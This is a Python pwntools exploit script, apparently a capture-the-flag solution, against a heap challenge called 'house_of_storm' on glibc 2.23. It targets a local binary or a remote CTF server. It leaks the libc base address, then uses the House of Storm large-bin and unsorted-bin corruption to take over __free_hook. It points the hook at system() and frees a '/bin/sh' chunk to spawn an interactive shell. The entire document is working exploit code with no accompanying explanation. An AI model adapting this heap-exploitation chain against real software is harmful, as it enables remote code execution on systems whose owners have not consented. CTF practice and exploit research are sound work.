import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./house_of_storm')
	elf=ELF('./house_of_storm')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else :
	io=remote('nc.eonew.cn',10001)
	elf=ELF('./house_of_storm')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def add(a):
	io.sendlineafter('?\n','1')
	io.sendlineafter('?\n',str(a))

def edit(a,b):
	io.sendlineafter('?\n','3')
	io.sendlineafter('?\n',str(a))
	io.sendlineafter('?\n',b)

def show(a):
	io.sendlineafter('?\n','4')
	io.sendlineafter('?\n',str(a))

def delete(a):
	io.sendlineafter('?\n','2')
	io.sendlineafter('?\n',str(a))



add(0x500)
add(0x4f0)


delete(0)
show(0)
libc_base=u64(io.recv(6)+'\x00\x00')-88-libc.sym['__malloc_hook']-0x10
success('libc_base:'+hex(libc_base))

delete(1)
add(0x18)
add(0x4e8)
add(0x18)
add(0x4d8)
add(0x18)
delete(5)
delete(3)
add(0x4e8)
delete(3)

free_hook_addr=libc_base+libc.sym['__free_hook']
success('free_hook_addr:'+hex(free_hook_addr))
fake_chunk_addr=free_hook_addr-0x20

edit(0,'\x00'*0x18+p64(0x4f1)+p64(0)+p64(fake_chunk_addr))
edit(1,'\x00'*0x18+p64(0x4d1)+p64(0)+p64(fake_chunk_addr+8)+p64(0)+p64(fake_chunk_addr-0x18-5))
add(0x48)
edit(8,'a'*0x10+p64(libc_base+libc.sym['system']))
edit(0,'/bin/sh\x00')
delete(0)



#gdb.attach(io)
#pause()
io.interactive()